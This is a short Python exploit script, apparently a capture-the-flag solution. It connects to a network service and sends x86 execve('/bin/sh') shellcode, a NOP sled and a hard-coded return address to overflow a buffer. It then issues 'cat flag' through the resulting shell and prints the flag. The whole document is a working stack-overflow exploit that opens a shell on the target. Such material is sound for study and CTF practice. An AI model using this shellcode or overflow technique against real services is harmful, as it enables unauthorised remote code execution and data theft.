import socket
from sys import argv
from pwn import *

def getbuff(IPaddr, port):

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((IPaddr, int(port)))
	
	shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
	nopsled = "\x90"*487
	buffstart = "\x98\xd2\xff\xff"
	while 1:
		output = s.recv(1024)
		if "verify" in output:
			#print output
			s.sendall((shellcode+nopsled+buffstart)*2+'\n')
			#s.sendall(shellcode+"\x90"*487+"\x98\xd2\xff\xff"+shellcode+"\x90"*487+"\x98\xd2\xff\xff"+'\n')
			s.send("cat flag\n")
		elif "FLAG" in output:
			print output
			break
		elif not output:
			break
		#else:
			#print output

getbuff(argv[1], argv[2])

